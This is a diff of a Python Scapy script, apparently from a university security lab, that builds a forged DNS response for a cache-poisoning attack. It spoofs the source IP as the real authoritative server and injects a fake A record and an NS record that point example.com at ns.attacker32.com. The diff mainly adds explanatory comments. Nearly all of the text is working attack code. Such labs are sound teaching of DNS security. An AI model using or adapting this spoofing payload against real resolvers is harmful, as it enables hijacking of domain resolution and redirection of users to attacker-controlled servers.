@@ -3,25 +3,26 @@
 from scapy.all import *
 from scapy.layers.inet import IP, UDP
 from scapy.layers.dns import DNSRR, DNS, DNSQR
-
-
-
 # Parameters
 local_dns_server = '10.9.0.53'    
 target_dns_server = '199.43.135.53' 
 
 name = 'twysw.example.com'  # hostname used in attack
-domain = "example.com"
+domain = "example.com" 
 ns = "ns.attacker32.com"
 
 # Construct the DNS headers and payload
-Qdsec = DNSQR(qname=name)
-Anssec = DNSRR(rrname=name,type='A',rdata='1.2.3.4',ttl=259200)  # Create DNS answer
+Qdsec = DNSQR(qname=name) # DNS question record
+# The DNS answer record, pointing to the attacker's IP
+Anssec = DNSRR(rrname=name,type='A',rdata='1.2.3.4',ttl=259200)  
+# The DNS NS record, pointing to the attacker's NS server
 NSsec = DNSRR(rrname=domain,type='NS',rdata=ns,ttl=259200)
+# The DNS response packet
 dns = DNS(id=0xAAAA,aa=1,ra =0 ,rd=0,cd =0 ,qr=1,qdcount=1,ancount=1,nscount=1,arcount=0,qd=Qdsec,an=Anssec,ns=NSsec)  # DNS response packet
 
 # Construct the full packet (IP + UDP + DNS)
 ip = IP(src=target_dns_server ,dst=local_dns_server,chksum=0)  
+# dport is the port of the DNS server,as mantion in the lab to ease the process
 udp = UDP(sport=53 ,dport=33333,chksum=0)                           # UDP header
 response = ip / udp / dns                               # Full response packet
 
